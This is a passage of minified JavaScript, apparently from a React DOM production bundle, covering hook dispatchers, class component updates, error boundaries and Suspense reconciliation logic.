a[0];if(a=e(),ha){$t(!0);try{e()}finally{$t(!1)}}return l.memoizedState=[a,t],a}function Bc(e,t,l){return l===void 0||(ml&1073741824)!==0&&(me&261930)===0?e.memoizedState=t:(e.memoizedState=l,e=Zf(),ae.lanes|=e,Ll|=e,l)}function Qr(e,t,l,a){return Et(l,t)?l:Xa.current!==null?(e=Bc(e,l,a),Et(e,t)||(Fe=!0),e):(ml&42)===0||(ml&1073741824)!==0&&(me&261930)===0?(Fe=!0,e.memoizedState=l):(e=Zf(),ae.lanes|=e,Ll|=e,t)}function Zr(e,t,l,a,n){var i=_.p;_.p=i!==0&&8>i?i:8;var c=S.T,u={};S.T=u,Gc(e,!1,t,l);try{var r=n(),p=S.S;if(p!==null&&p(u,r),r!==null&&typeof r=="object"&&typeof r.then=="function"){var x=jm(r,a);Hn(e,t,x,Dt(e))}else Hn(e,t,a,Dt(e))}catch(A){Hn(e,t,{then:function(){},status:"rejected",reason:A},Dt())}finally{_.p=i,c!==null&&u.types!==null&&(c.types=u.types),S.T=c}}function zm(){}function Yc(e,t,l,a){if(e.tag!==5)throw Error(m(476));var n=Kr(e).queue;Zr(e,n,t,K,l===null?zm:function(){return Jr(e),l(a)})}function Kr(e){var t=e.memoizedState;if(t!==null)return t;t={memoizedState:K,baseState:K,baseQueue:null,queue:{pending:null,lanes:0,dispatch:null,lastRenderedReducer:yl,lastRenderedState:K},next:null};var l={};return t.next={memoizedState:l,baseState:l,baseQueue:null,queue:{pending:null,lanes:0,dispatch:null,lastRenderedReducer:yl,lastRenderedState:l},next:null},e.memoizedState=t,e=e.alternate,e!==null&&(e.memoizedState=t),t}function Jr(e){var t=Kr(e);t.next===null&&(t=e.alternate.memoizedState),Hn(e,t.next.queue,{},Dt())}function qc(){return ut(Fn)}function Wr(){return Ze().memoizedState}function $r(){return Ze().memoizedState}function Om(e){for(var t=e.return;t!==null;){switch(t.tag){case 24:case 3:var l=Dt();e=Ml(l);var a=Dl(t,e,l);a!==null&&(Nt(a,t,l),On(a,t,l)),t={cache:pc()},e.payload=t;return}t=t.return}}function wm(e,t,l){var a=Dt();l={lane:a,revertLane:0,gesture:null,action:l,hasEagerState:!1,eagerState:null,next:null},Ki(e)?Ir(t,l):(l=ic(e,t,l,a),l!==null&&(Nt(l,e,a),Pr(l,t,a)))}function Fr(e,t,l){var a=Dt();Hn(e,t,l,a)}function Hn(e,t,l,a){var n={lane:a,revertLane:0,gesture:null,action:l,hasEagerState:!1,eagerState:null,next:null};if(Ki(e))Ir(t,n);else{var i=e.alternate;if(e.lanes===0&&(i===null||i.lanes===0)&&(i=t.lastRenderedReducer,i!==null))try{var c=t.lastRenderedState,u=i(c,l);if(n.hasEagerState=!0,n.eagerState=u,Et(u,c))return Ei(e,t,n,0),_e===null&&Ai(),!1}catch{}if(l=ic(e,t,n,a),l!==null)return Nt(l,e,a),Pr(l,t,a),!0}return!1}function Gc(e,t,l,a){if(a={lane:2,revertLane:Su(),gesture:null,action:a,hasEagerState:!1,eagerState:null,next:null},Ki(e)){if(t)throw Error(m(479))}else t=ic(e,l,a,2),t!==null&&Nt(t,e,2)}function Ki(e){var t=e.alternate;return e===ae||t!==null&&t===ae}function Ir(e,t){Qa=Yi=!0;var l=e.pending;l===null?t.next=t:(t.next=l.next,l.next=t),e.pending=t}function Pr(e,t,l){if((l&4194048)!==0){var a=t.lanes;a&=e.pendingLanes,l|=a,t.lanes=l,hi(e,l)}}var kn={readContext:ut,use:Vi,useCallback:Ye,useContext:Ye,useEffect:Ye,useImperativeHandle:Ye,useLayoutEffect:Ye,useInsertionEffect:Ye,useMemo:Ye,useReducer:Ye,useRef:Ye,useState:Ye,useDebugValue:Ye,useDeferredValue:Ye,useTransition:Ye,useSyncExternalStore:Ye,useId:Ye,useHostTransitionStatus:Ye,useFormState:Ye,useActionState:Ye,useOptimistic:Ye,useMemoCache:Ye,useCacheRefresh:Ye};kn.useEffectEvent=Ye;var ef={readContext:ut,use:Vi,useCallback:function(e,t){return vt().memoizedState=[e,t===void 0?null:t],e},useContext:ut,useEffect:Ur,useImperativeHandle:function(e,t,l){l=l!=null?l.concat([e]):null,Qi(4194308,4,qr.bind(null,t,e),l)},useLayoutEffect:function(e,t){return Qi(4194308,4,e,t)},useInsertionEffect:function(e,t){Qi(4,2,e,t)},useMemo:function(e,t){var l=vt();t=t===void 0?null:t;var a=e();if(ha){$t(!0);try{e()}finally{$t(!1)}}return l.memoizedState=[a,t],a},useReducer:function(e,t,l){var a=vt();if(l!==void 0){var n=l(t);if(ha){$t(!0);try{l(t)}finally{$t(!1)}}}else n=t;return a.memoizedState=a.baseState=n,e={pending:null,lanes:0,dispatch:null,lastRenderedReducer:e,lastRenderedState:n},a.queue=e,e=e.dispatch=wm.bind(null,ae,e),[a.memoizedState,e]},useRef:function(e){var t=vt();return e={current:e},t.memoizedState=e},useState:function(e){e=kc(e);var t=e.queue,l=Fr.bind(null,ae,t);return t.dispatch=l,[e.memoizedState,l]},useDebugValue:Lc,useDeferredValue:function(e,t){var l=vt();return Bc(l,e,t)},useTransition:function(){var e=kc(!1);return e=Zr.bind(null,ae,e.queue,!0,!1),vt().memoizedState=e,[!1,e]},useSyncExternalStore:function(e,t,l){var a=ae,n=vt();if(ge){if(l===void 0)throw Error(m(407));l=l()}else{if(l=t(),_e===null)throw Error(m(349));(me&127)!==0||xr(a,t,l)}n.memoizedState=l;var i={value:l,getSnapshot:t};return n.queue=i,Ur(Tr.bind(null,a,i,e),[e]),a.flags|=2048,Ka(9,{destroy:void 0},jr.bind(null,a,i,l,t),null),l},useId:function(){var e=vt(),t=_e.identifierPrefix;if(ge){var l=It,a=Ft;l=(a&~(1<<32-gt(a)-1)).toString(32)+l,t="_"+t+"R_"+l,l=qi++,0<l&&(t+="H"+l.toString(32)),t+="_"}else l=Tm++,t="_"+t+"r_"+l.toString(32)+"_";return e.memoizedState=t},useHostTransitionStatus:qc,useFormState:Mr,useActionState:Mr,useOptimistic:function(e){var t=vt();t.memoizedState=t.baseState=e;var l={pending:null,lanes:0,dispatch:null,lastRenderedReducer:null,lastRenderedState:null};return t.queue=l,t=Gc.bind(null,ae,!0,l),l.dispatch=t,[e,t]},useMemoCache:Mc,useCacheRefresh:function(){return vt().memoizedState=Om.bind(null,ae)},useEffectEvent:function(e){var t=vt(),l={impl:e};return t.memoizedState=l,function(){if((je&2)!==0)throw Error(m(440));return l.impl.apply(void 0,arguments)}}},Vc={readContext:ut,use:Vi,useCallback:Vr,useContext:ut,useEffect:Uc,useImperativeHandle:Gr,useInsertionEffect:Br,useLayoutEffect:Yr,useMemo:Xr,useReducer:Xi,useRef:Rr,useState:function(){return Xi(yl)},useDebugValue:Lc,useDeferredValue:function(e,t){var l=Ze();return Qr(l,ze.memoizedState,e,t)},useTransition:function(){var e=Xi(yl)[0],t=Ze().memoizedState;return[typeof e=="boolean"?e:Dn(e),t]},useSyncExternalStore:Sr,useId:Wr,useHostTransitionStatus:qc,useFormState:Dr,useActionState:Dr,useOptimistic:function(e,t){var l=Ze();return Ar(l,ze,e,t)},useMemoCache:Mc,useCacheRefresh:$r};Vc.useEffectEvent=Lr;var tf={readContext:ut,use:Vi,useCallback:Vr,useContext:ut,useEffect:Uc,useImperativeHandle:Gr,useInsertionEffect:Br,useLayoutEffect:Yr,useMemo:Xr,useReducer:Hc,useRef:Rr,useState:function(){return Hc(yl)},useDebugValue:Lc,useDeferredValue:function(e,t){var l=Ze();return ze===null?Bc(l,e,t):Qr(l,ze.memoizedState,e,t)},useTransition:function(){var e=Hc(yl)[0],t=Ze().memoizedState;return[typeof e=="boolean"?e:Dn(e),t]},useSyncExternalStore:Sr,useId:Wr,useHostTransitionStatus:qc,useFormState:kr,useActionState:kr,useOptimistic:function(e,t){var l=Ze();return ze!==null?Ar(l,ze,e,t):(l.baseState=e,[e,l.queue.dispatch])},useMemoCache:Mc,useCacheRefresh:$r};tf.useEffectEvent=Lr;function Xc(e,t,l,a){t=e.memoizedState,l=l(a,t),l=l==null?t:Q({},t,l),e.memoizedState=l,e.lanes===0&&(e.updateQueue.baseState=l)}var Qc={enqueueSetState:function(e,t,l){e=e._reactInternals;var a=Dt(),n=Ml(a);n.payload=t,l!=null&&(n.callback=l),t=Dl(e,n,a),t!==null&&(Nt(t,e,a),On(t,e,a))},enqueueReplaceState:function(e,t,l){e=e._reactInternals;var a=Dt(),n=Ml(a);n.tag=1,n.payload=t,l!=null&&(n.callback=l),t=Dl(e,n,a),t!==null&&(Nt(t,e,a),On(t,e,a))},enqueueForceUpdate:function(e,t){e=e._reactInternals;var l=Dt(),a=Ml(l);a.tag=2,t!=null&&(a.callback=t),t=Dl(e,a,l),t!==null&&(Nt(t,e,l),On(t,e,l))}};function lf(e,t,l,a,n,i,c){return e=e.stateNode,typeof e.shouldComponentUpdate=="function"?e.shouldComponentUpdate(a,i,c):t.prototype&&t.prototype.isPureReactComponent?!xn(l,a)||!xn(n,i):!0}function af(e,t,l,a){e=t.state,typeof t.componentWillReceiveProps=="function"&&t.componentWillReceiveProps(l,a),typeof t.UNSAFE_componentWillReceiveProps=="function"&&t.UNSAFE_componentWillReceiveProps(l,a),t.state!==e&&Qc.enqueueReplaceState(t,t.state,null)}function ma(e,t){var l=t;if("ref"in t){l={};for(var a in t)a!=="ref"&&(l[a]=t[a])}if(e=e.defaultProps){l===t&&(l=Q({},l));for(var n in e)l[n]===void 0&&(l[n]=e[n])}return l}function nf(e){Ci(e)}function sf(e){console.error(e)}function cf(e){Ci(e)}function Ji(e,t){try{var l=e.onUncaughtError;l(t.value,{componentStack:t.stack})}catch(a){setTimeout(function(){throw a})}}function uf(e,t,l){try{var a=e.onCaughtError;a(l.value,{componentStack:l.stack,errorBoundary:t.tag===1?t.stateNode:null})}catch(n){setTimeout(function(){throw n})}}function Zc(e,t,l){return l=Ml(l),l.tag=3,l.payload={element:null},l.callback=function(){Ji(e,t)},l}function of(e){return e=Ml(e),e.tag=3,e}function rf(e,t,l,a){var n=l.type.getDerivedStateFromError;if(typeof n=="function"){var i=a.value;e.payload=function(){return n(i)},e.callback=function(){uf(t,l,a)}}var c=l.stateNode;c!==null&&typeof c.componentDidCatch=="function"&&(e.callback=function(){uf(t,l,a),typeof n!="function"&&(Bl===null?Bl=new Set([this]):Bl.add(this));var u=a.stack;this.componentDidCatch(a.value,{componentStack:u!==null?u:""})})}function _m(e,t,l,a,n){if(l.flags|=32768,a!==null&&typeof a=="object"&&typeof a.then=="function"){if(t=l.alternate,t!==null&&Ba(t,l,n,!0),l=Ot.current,l!==null){switch(l.tag){case 31:case 13:return Gt===null?ss():l.alternate===null&&qe===0&&(qe=3),l.flags&=-257,l.flags|=65536,l.lanes=n,a===ki?l.flags|=16384:(t=l.updateQueue,t===null?l.updateQueue=new Set([a]):t.add(a),gu(e,a,n)),!1;case 22:return l.flags|=65536,a===ki?l.flags|=16384:(t=l.updateQueue,t===null?(t={transitions:null,markerInstances:null,retryQueue:new Set([a])},l.updateQueue=t):(l=t.retryQueue,l===null?t.retryQueue=new Set([a]):l.add(a)),gu(e,a,n)),!1}throw Error(m(435,l.tag))}return gu(e,a,n),ss(),!1}if(ge)return t=Ot.current,t!==null?((t.flags&65536)===0&&(t.flags|=256),t.flags|=65536,t.lanes=n,a!==fc&&(e=Error(m(422),{cause:a}),Nn(Lt(e,l)))):(a!==fc&&(t=Error(m(423),{cause:a}),Nn(Lt(t,l))),e=e.current.alternate,e.flags|=65536,n&=-n,e.lanes|=n,a=Lt(a,l),n=Zc(e.stateNode,a,n),jc(e,n),qe!==4&&(qe=2)),!1;var i=Error(m(520),{cause:a});if(i=Lt(i,l),Vn===null?Vn=[i]:Vn.push(i),qe!==4&&(qe=2),t===null)return!0;a=Lt(a,l),l=t;do{switch(l.tag){case 3:return l.flags|=65536,e=n&-n,l.lanes|=e,e=Zc(l.stateNode,a,e),jc(l,e),!1;case 1:if(t=l.type,i=l.stateNode,(l.flags&128)===0&&(typeof t.getDerivedStateFromError=="function"||i!==null&&typeof i.componentDidCatch=="function"&&(Bl===null||!Bl.has(i))))return l.flags|=65536,n&=-n,l.lanes|=n,n=of(n),rf(n,e,l,a),jc(l,n),!1}l=l.return}while(l!==null);return!1}var Kc=Error(m(461)),Fe=!1;function ot(e,t,l,a){t.child=e===null?hr(t,null,l,a):da(t,e.child,l,a)}function ff(e,t,l,a,n){l=l.render;var i=t.ref;if("ref"in a){var c={};for(var u in a)u!=="ref"&&(c[u]=a[u])}else c=a;return ua(t),a=zc(e,t,l,c,i,n),u=Oc(),e!==null&&!Fe?(wc(e,t,n),pl(e,t,n)):(ge&&u&&oc(t),t.flags|=1,ot(e,t,a,n),t.child)}function df(e,t,l,a,n){if(e===null){var i=l.type;return typeof i=="function"&&!sc(i)&&i.defaultProps===void 0&&l.compare===null?(t.tag=15,t.type=i,hf(e,t,i,a,n)):(e=Oi(l.type,null,a,t,t.mode,n),e.ref=t.ref,e.return=t,t.child=e)}if(i=e.child,!tu(e,n)){var c=i.memoizedProps;if(l=l.compare,l=l!==null?l:xn,l(c,a)&&e.ref===t.ref)return pl(e,t,n)}return t.flags|=1,e=rl(i,a),e.ref=t.ref,e.return=t,t.child=e}function hf(e,t,l,a,n){if(e!==null){var i=e.memoizedProps;if(xn(i,a)&&e.ref===t.ref)if(Fe=!1,t.pendingProps=a=i,tu(e,n))(e.flags&131072)!==0&&(Fe=!0);else return t.lanes=e.lanes,pl(e,t,n)}return Jc(e,t,l,a,n)}function mf(e,t,l,a){var n=a.children,i=e!==null?e.memoizedState:null;if(e===null&&t.stateNode===null&&(t.stateNode={_visibility:1,_pendingMarkers:null,_retryCache:null,_transitions:null}),a.mode==="hidden"){if((t.flags&128)!==0){if(i=i!==null?i.baseLanes|l:l,e!==null){for(a=t.child=e.child,n=0;a!==null;)n=n|a.lanes|a.childLanes,a=a.sibling;a=n&~i}else a=0,t.child=null;return yf(e,t,i,l,a)}if((l&536870912)!==0)t.memoizedState={baseLanes:0,cachePool:null},e!==null&&Di(t,i!==null?i.cachePool:null),i!==null?pr(t,i):Nc(),gr(t);else return a=t.lanes=536870912,yf(e,t,i!==null?i.baseLanes|l:l,l,a)}else i!==null?(Di(t,i.cachePool),pr(t,i),kl(),t.memoizedState=null):(e!==null&&Di(t,null),Nc(),kl());return ot(e,t,n,l),t.child}function Rn(e,t){return e!==null&&e.tag===22||t.stateNode!==null||(t.stateNode={_visibility:1,_pendingMarkers:null,_retryCache:null,_transitions:null}),t.sibling}function yf(e,t,l,a,n){var i=vc();return i=i===null?null:{parent:We._currentValue,pool:i},t.memoizedState={baseLanes:l,cachePool:i},e!==null&&Di(t,null),Nc(),gr(t),e!==null&&Ba(e,t,a,!0),t.childLanes=n,null}function Wi(e,t){return t=Fi({mode:t.mode,children:t.children},e.mode),t.ref=e.ref,e.child=t,t.return=e,t}function pf(e,t,l){return da(t,e.child,null,l),e=Wi(t,t.pendingProps),e.flags|=2,wt(t),t.memoizedState=null,e}function Mm(e,t,l){var a=t.pendingProps,n=(t.flags&128)!==0;if(t.flags&=-129,e===null){if(ge){if(a.mode==="hidden")return e=Wi(t,a),t.lanes=536870912,Rn(null,e);if(Ac(t),(e=ke)?(e=zd(e,qt),e=e!==null&&e.data==="&"?e:null,e!==null&&(t.memoizedState={dehydrated:e,treeContext:El!==null?{id:Ft,overflow:It}:null,retryLane:536870912,hydrationErrors:null},l=Io(e),l.return=t,t.child=l,ct=t,ke=null)):e=null,e===null)throw Ol(t);return t.lanes=536870912,null}return Wi(t,a)}var i=e.memoizedState;if(i!==null){var c=i.dehydrated;if(Ac(t),n)if(t.flags&256)t.flags&=-257,t=pf(e,t,l);else if(t.memoizedState!==null)t.child=e.child,t.flags|=128,t=null;else throw Error(m(558));else if(Fe||Ba(e,t,l,!1),n=(l&e.childLanes)!==0,Fe||n){if(a=_e,a!==null&&(c=o(a,l),c!==0&&c!==i.retryLane))throw i.retryLane=c,na(e,c),Nt(a,e,c),Kc;ss(),t=pf(e,t,l)}else e=i.treeContext,ke=Vt(c.nextSibling),ct=t,ge=!0,zl=null,qt=!1,e!==null&&tr(t,e),t=Wi(t,a),t.flags|=4096;return t}return e=rl(e.child,{mode:a.mode,children:a.children}),e.ref=t.ref,t.child=e,e.return=t,e}function $i(e,t){var l=t.ref;if(l===null)e!==null&&e.ref!==null&&(t.flags|=4194816);else{if(typeof l!="function"&&typeof l!="object")throw Error(m(284));(e===null||e.ref!==l)&&(t.flags|=4194816)}}function Jc(e,t,l,a,n){return ua(t),l=zc(e,t,l,a,void 0,n),a=Oc(),e!==null&&!Fe?(wc(e,t,n),pl(e,t,n)):(ge&&a&&oc(t),t.flags|=1,ot(e,t,l,n),t.child)}function gf(e,t,l,a,n,i){return ua(t),t.updateQueue=null,l=br(t,a,l,n),vr(e),a=Oc(),e!==null&&!Fe?(wc(e,t,i),pl(e,t,i)):(ge&&a&&oc(t),t.flags|=1,ot(e,t,l,i),t.child)}function vf(e,t,l,a,n){if(ua(t),t.stateNode===null){var i=ka,c=l.contextType;typeof c=="object"&&c!==null&&(i=ut(c)),i=new l(a,i),t.memoizedState=i.state!==null&&i.state!==void 0?i.state:null,i.updater=Qc,t.stateNode=i,i._reactInternals=t,i=t.stateNode,i.props=a,i.state=t.memoizedState,i.refs={},Sc(t),c=l.contextType,i.context=typeof c=="object"&&c!==null?ut(c):ka,i.state=t.memoizedState,c=l.getDerivedStateFromProps,typeof c=="function"&&(Xc(t,l,c,a),i.state=t.memoizedState),typeof l.getDerivedStateFromProps=="function"||typeof i.getSnapshotBeforeUpdate=="function"||typeof i.UNSAFE_componentWillMount!="function"&&typeof i.componentWillMount!="function"||(c=i.state,typeof i.componentWillMount=="function"&&i.componentWillMount(),typeof i.UNSAFE_componentWillMount=="function"&&i.UNSAFE_componentWillMount(),c!==i.state&&Qc.enqueueReplaceState(i,i.state,null),_n(t,a,i,n),wn(),i.state=t.memoizedState),typeof i.componentDidMount=="function"&&(t.flags|=4194308),a=!0}else if(e===null){i=t.stateNode;var u=t.memoizedProps,r=ma(l,u);i.props=r;var p=i.context,x=l.contextType;c=ka,typeof x=="object"&&x!==null&&(c=ut(x));var A=l.getDerivedStateFromProps;x=typeof A=="function"||typeof i.getSnapshotBeforeUpdate=="function",u=t.pendingProps!==u,x||typeof i.UNSAFE_componentWillReceiveProps!="function"&&typeof i.componentWillReceiveProps!="function"||(u||p!==c)&&af(t,i,a,c),_l=!1;var g=t.memoizedState;i.state=g,_n(t,a,i,n),wn(),p=t.memoizedState,u||g!==p||_l?(typeof A=="function"&&(Xc(t,l,A,a),p=t.memoizedState),(r=_l||lf(t,l,r,a,g,p,c))?(x||typeof i.UNSAFE_componentWillMount!="function"&&typeof i.componentWillMount!="function"||(typeof i.componentWillMount=="function"&&i.componentWillMount(),typeof i.UNSAFE_componentWillMount=="function"&&i.UNSAFE_componentWillMount()),typeof i.componentDidMount=="function"&&(t.flags|=4194308)):(typeof i.componentDidMount=="function"&&(t.flags|=4194308),t.memoizedProps=a,t.memoizedState=p),i.props=a,i.state=p,i.context=c,a=r):(typeof i.componentDidMount=="function"&&(t.flags|=4194308),a=!1)}else{i=t.stateNode,xc(e,t),c=t.memoizedProps,x=ma(l,c),i.props=x,A=t.pendingProps,g=i.context,p=l.contextType,r=ka,typeof p=="object"&&p!==null&&(r=ut(p)),u=l.getDerivedStateFromProps,(p=typeof u=="function"||typeof i.getSnapshotBeforeUpdate=="function")||typeof i.UNSAFE_componentWillReceiveProps!="function"&&typeof i.componentWillReceiveProps!="function"||(c!==A||g!==r)&&af(t,i,a,r),_l=!1,g=t.memoizedState,i.state=g,_n(t,a,i,n),wn();var v=t.memoizedState;c!==A||g!==v||_l||e!==null&&e.dependencies!==null&&_i(e.dependencies)?(typeof u=="function"&&(Xc(t,l,u,a),v=t.memoizedState),(x=_l||lf(t,l,x,a,g,v,r)||e!==null&&e.dependencies!==null&&_i(e.dependencies))?(p||typeof i.UNSAFE_componentWillUpdate!="function"&&typeof i.componentWillUpdate!="function"||(typeof i.componentWillUpdate=="function"&&i.componentWillUpdate(a,v,r),typeof i.UNSAFE_componentWillUpdate=="function"&&i.UNSAFE_componentWillUpdate(a,v,r)),typeof i.componentDidUpdate=="function"&&(t.flags|=4),typeof i.getSnapshotBeforeUpdate=="function"&&(t.flags|=1024)):(typeof i.componentDidUpdate!="function"||c===e.memoizedProps&&g===e.memoizedState||(t.flags|=4),typeof i.getSnapshotBeforeUpdate!="function"||c===e.memoizedProps&&g===e.memoizedState||(t.flags|=1024),t.memoizedProps=a,t.memoizedState=v),i.props=a,i.state=v,i.context=r,a=x):(typeof i.componentDidUpdate!="function"||c===e.memoizedProps&&g===e.memoizedState||(t.flags|=4),typeof i.getSnapshotBeforeUpdate!="function"||c===e.memoizedProps&&g===e.memoizedState||(t.flags|=1024),a=!1)}return i=a,$i(e,t),a=(t.flags&128)!==0,i||a?(i=t.stateNode,l=a&&typeof l.getDerivedStateFromError!="function"?null:i.render(),t.flags|=1,e!==null&&a?(t.child=da(t,e.child,null,n),t.child=da(t,null,l,n)):ot(e,t,l,n),t.memoizedState=i.state,e=t.child):e=pl(e,t,n),e}function bf(e,t,l,a){return sa(),t.flags|=256,ot(e,t,l,a),t.child}var Wc={dehydrated:null,treeContext:null,retryLane:0,hydrationErrors:null};function $c(e){return{baseLanes:e,cachePool:cr()}}function Fc(e,t,l){return e=e!==null?e.childLanes&~l:0,t&&(e|=Mt),e}function Sf(e,t,l){var a=t.pendingProps,n=!1,i=(t.flags&128)!==0,c;if((c=i)||(c=e!==null&&e.memoizedState===null?!1:(Qe.current&2)!==0),c&&(n=!0,t.flags&=-129),c=(t.flags&32)!==0,t.flags&=-33,e===null){if(ge){if(n?Hl(t):kl(),(e=ke)?(e=zd(e,qt),e=e!==null&&e.data!=="&"?e:null,e!==null&&(t.memoizedState={dehydrated:e,treeContext:El!==null?{id:Ft,overflow:It}:null,retryLane:536870912,hydrationErrors:null},l=Io(e),l.return=t,t.child=l,ct=t,ke=null)):e=null,e===null)throw Ol(t);return Du(e)?t.lanes=32:t.lanes=536870912,null}var u=a.children;return a=a.fallback,n?(kl(),n=t.mode,u=Fi({mode:"hidden",children:u},n),a=ia(a,n,l,null),u.return=t,a.return=t,u.sibling=a,t.child=u,a=t.child,a.memoizedState=$c(l),a.childLanes=Fc(e,c,l),t.memoizedState=Wc,Rn(null,a)):(Hl(t),Ic(t,u))}var r=e.memoizedState;if(r!==null&&(u=r.dehydrated,u!==null)){if(i)t.flags&256?(Hl(t),t.flags&=-257,t=Pc(e,t,l)):t.memoizedState!==null?(kl(),t.child=e.child,t.flags|=128,t=null):(kl(),u=a.fallback,n=t.mode,a=Fi({mode:"visible",children:a.children},n),u=ia(u,n,l,null),u.flags|=2,a.return=t,u.return=t,a.sibling=u,t.child=a,da(t,e.child,null,l),a=t.child,a.memoizedState=$c(l),a.childLanes=Fc(e,c,l),t.memoizedState=Wc,t=Rn(null,a));else if(Hl(t),Du(u)){if(c=u.nextSibling&&u.nextSibling.dataset,c)var p=c.dgst;c=p,a=Error(m(419)),a.stack="",a.digest=c,Nn({value:a,source:null,stack:null}),t=Pc(e,t,l)}else if(Fe||Ba(e,t,l,!1),c=(l&e.childLanes)!==0,Fe||c){if(c=_e,c!==null&&(a=o(c,l),a!==0&&a!==r.retryLane))throw r.retryLane=a,na(e,a),Nt(c,e,a),Kc;Mu(u)||ss(),t=Pc(e,t,l)}else Mu(u)?(t.flags|=192,t.child=e.child,t=null):(e=r.treeContext,ke=Vt(u.nextSibling),ct=t,ge=!0,zl=null,qt=!1,e!==null&&tr(t,e),t=Ic(t,a.children),t.flags|=4096);return t}return n?(kl(),u=a.fallback,n=t.mode,r=e.child,p=r.sibling,a=rl(r,{mode:"hidden",children:a.children}),a.subtreeFlags=r.subtreeFlags&65011712,p!==null?u=rl(p,u):(u=ia(u,n,l,null),u.flags|=2),u.return=t,a.return=t,a.sibling=u,t.child=a,Rn(null,a),a=t.child,u=e.child.memoizedState,u===null?u=$c(l):(n=u.cachePool,n!==null?(r=We._currentValue,n=n.parent!==r?{parent:r,pool:r}:n):n=cr(),u={baseLanes:u.baseLanes|l,cachePool:n}),a.memoizedState=u,a.childLanes=Fc(e,c,l),t.memoizedState=Wc,Rn(e.child,a)):(Hl(t),l=e.child,e=l.sibling,l=rl(l,{mode:"visible",children:a.children}),l.return=t,l.sibling=null,e!==null&&(c=t.deletions,c===null?(t.deletions=[e],t.flags|=16):c.push(e)),t.child=l,t.memoizedState=null,l)}function Ic(e,t){return t=Fi({mode:"visible",children:t},e.mode),t.return=e,e.child=t}function Fi(e,t){return e=zt(22,e,null,t),e.lanes=0,e}function Pc(e,t,l){return da(t,e.child,null,l),e=Ic(t,t.pendingProps.children),e.flags|=2,t.memoizedState=null,e}function xf(e,t,l){e.lanes|=t;var a=e.alternate;a!==null&&(a.lanes|=t),mc(e.return,t,l)}function eu(e,t,l,a,n,i){var c=e.memoizedState;c===null?e.memoizedState={isBackwards:t,rendering:null,renderingStartTime:0,last:a,tail:l,tailMode:n,treeForkCount:i}:(c.isBackwards=t,c.rendering=null,c.renderingStartTime=0,c.last=a,c.tail=l,c.tailMode=n,c.treeForkCount=i)}function jf(e,t,l){var a=t.pendingProps,n=a.revealOrder,i=a.tail;a=a.children;var c=Qe.current,u=(c&2)!==0;if(u?(c=c&1|2,t.flags|=128):c&=1,w(Qe,c),ot(e,t,a,l),a=ge?Tn:0,!u&&e!==null&&(e.flags&128)!==0)e:for(e=t.child;e!==null;){if(e.tag===13)e.memoizedState!==null&&xf(e,l,t);else if(e.tag===19)xf(e,l,t);else if(e.child!==null){e.child.return=e,e=e.child;continue}if(e===t)break e;for(;e.sibling===null;){if(e.return===null||e.return===t)break e;e=e.return}e.sibling.return=e.return,e=e.sibling}switch(n){case"forwards":for(l=t.child,n=null;l!==null;)e=l.alternate,e!==null&&Bi(e)===null&&(n=l),l=l.sibling;l=n,l===null?(n=t.child,t.child=null):(n=l.sibling,l.sibling=null),eu(t,!1,n,l,i,a);break;case"backwards":case"unstable_legacy-backwards":for(l=null,n=t.child,t.child=null;n!==null;){if(e=n.alternate,e!==null&&Bi(e)===null){t.child=n;break}e=n.sibling,n.sibling=l,l=n,n=e}eu(t,!0,l,null,i,a);break;case"together":eu(t,!1,null,null,void 0,a);break;default:t.memoizedState=null}return t.child}function pl(e,t,l){if(e!==null&&(t.dependencies=e.dependencies),Ll|=t.lanes,(l&t.childLanes)===0)if(e!==null){if(Ba(e,t,l,!1),(l&t.childLanes)===0)return null}else return null;if(e!==null&&t.child!==e.child)throw Error(m(153));if(t.child!==null){for(e=t.child,l=rl(e,e.pendingProps),t.child=l,l.return=t;e.sibling!==null;)e=e.sibling,l=l.sibling=rl(e,e.pendingProps),l.return=t;l.sibling=null}return t.child}function tu(e,t){return(e.lanes&t)!==0?!0:(e=e.dependencies,!!(e!==null&&_i(e)))}function Dm(e,t,l){switch(t.tag){case 3:lt(t,t.stateNode.containerInfo),wl(t,We,e.memoizedState.cache),sa();break;case 27:case 5:Ht(t);break;case 4:lt(t,t.stateNode.containerInfo);break;case 10:wl(t,t.type,t.memoizedProps.value);break;case 31:if(t.memoizedState!==null)return t.flags|=128,Ac(t),null;break;case 13:var a=t.memoizedState;if(a!==null)return a.dehydrated!==null?(Hl(t),t.flags|=128,null):(l&t.child.childLanes)!==0?Sf(e,t,l):(Hl(t),e=pl(e,t,l),e!==null?e.sibling:null);Hl(t);break;case 19:var n=(e.flags&128)!==0;if(a=(l&t.childLanes)!==0,a||(Ba(e,t,l,!1),a=(l&t.childLanes)!==0),n){if(a)return jf(e,t,l);t.flags|=128}if(n=t.memoizedState,n!==null&&(n.rendering=null,n.tail=null,n.lastEffect=null),w(Qe,Qe.current),a)break;return null;case 22:return t.lanes=0,mf(e,t,l,t.pendingProps);case 24:wl(t,We,e.memoizedState.cache)}return pl(e,t,l)}function Tf(e,t,l){if(e!==null)if(e.memoizedProps!==t.pendingProps)Fe=!0;else{if(!tu(e,l)&&(t.flags&128)===0)return Fe=!1,Dm(e,t,l);Fe=(e.flags&131072)!==0}else Fe=!1,ge&&(t.flags&1048576)!==0&&er(t,Tn,t.index);switch(t.lanes=0,t.tag){case 16:e:{var a=t.pendingProps;if(e=ra(t.elementType),t.type=e,typeof e=="function")sc(e)?(a=ma(e,a),t.tag=1,t=vf(null,t,e,a,l)):(t.tag=0,t=Jc(null,t,e,a,l));else{if(e!=null){var n=e.$$typeof;if(n===tt){t.tag=11,t=ff(null,t,e,a,l);break e}else if(n===D){t.tag=14,t=df(null,t,e,a,l);break e}}throw t=Je(e)||e,Error(m(306,t,""))}}return t;case 0:return Jc(e,t,t.type,t.pendingProps,l);case 1:return a=t.type,n=ma(a,t.pendingProps),vf(e,t,a,n,l);case 3:e:{if(lt(t,t.stateNode.containerInfo),e===null)throw Error(m(387));a=t.pendingProps;var i=t.memoizedState;n=i.element,xc(e,t),_n(t,a,null,l);var c=t.memoizedState;if(a=c.cache,wl(t,We,a),a!==i.cache&&yc(t,[We],l,!0),wn(),a=c.element,i.isDehydrated)if(i={element:a,isDehydrated:!1,cache:c.cache},t.updateQueue.baseState=i,t.memoizedState=i,t.flags&256){t=bf(e,t,a,l);break e}else if(a!==n){n=Lt(Error(m(424)),t),Nn(n),t=bf(e,t,a,l);break e}else for(e=t.stateNode.containerInfo,e.nodeType===9?e=e.body:e=e.nodeName==="HTML"?e.ownerDocument.body:e,ke=Vt(e.firstChild),ct=t,ge=!0,zl=null,qt=!0,l=hr(t,null,a,l),t.child=l;l;)l.flags=l.flags&-3|4096,l=l.sibling;else{if(sa(),a===n){t=pl(e,t,l);break e}ot(e,t,a,l)}t=t.child}return t;case 